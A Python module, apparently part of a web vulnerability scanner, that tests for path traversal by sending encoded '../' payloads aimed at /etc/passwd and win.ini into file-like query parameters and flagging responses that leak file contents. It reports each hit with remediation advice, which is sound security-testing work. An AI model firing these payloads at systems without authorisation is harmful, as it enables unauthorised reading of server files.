import asyncio
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT

logger = logging.getLogger(__name__)

TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd",          "root:"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("../../../windows/win.ini",     "[fonts]"),
    ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "[fonts]"),
]

PATH_PARAMS = {"file", "path", "page", "doc", "document", "include", "template",
               "view", "load", "read", "dir", "folder", "img", "image", "src", "name"}


class PathTraversal:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = ctx.get("endpoints", [])
        limiter = ctx["limiter"]
        sem = asyncio.Semaphore(10)

        async def probe(url: str):
            parsed = urlparse(url)
            if not parsed.query:
                return
            params = parse_qs(parsed.query)
            async with sem:
                for param in params:
                    if param.lower() not in PATH_PARAMS:
                        continue
                    for payload, indicator in TRAVERSAL_PAYLOADS:
                        p = dict(params)
                        p[param] = [payload]
                        probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                        try:
                            async with limiter.acquire():
                                async with make_client(timeout=PROBE_TIMEOUT) as c:
                                    r = await c.get(probe_url)
                            if indicator in r.text:
                                findings.append(Finding(
                                    title=f"Path Traversal in '{param}'",
                                    severity="Critical",
                                    description=f"Parameter '{param}' allows directory traversal. Server returned contents containing '{indicator}'.",
                                    affected_url=probe_url,
                                    proof=f"GET {probe_url}\nHTTP {r.status_code}\n{r.text[:400]}",
                                    remediation="Resolve the canonical path and verify it starts with the allowed base directory. Use os.path.realpath() and reject paths escaping the web root.",
                                    impact=5, likelihood=4, module="PathTraversal",
                                    references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                                ))
                                return
                        except Exception as e:
                            logger.debug(f"PathTraversal probe {probe_url}: {type(e).__name__}: {e}")

        await asyncio.gather(*[probe(u) for u in endpoints[:150]])
        logger.info(f"PathTraversal completed — {len(findings)} finding(s)")
        return findings
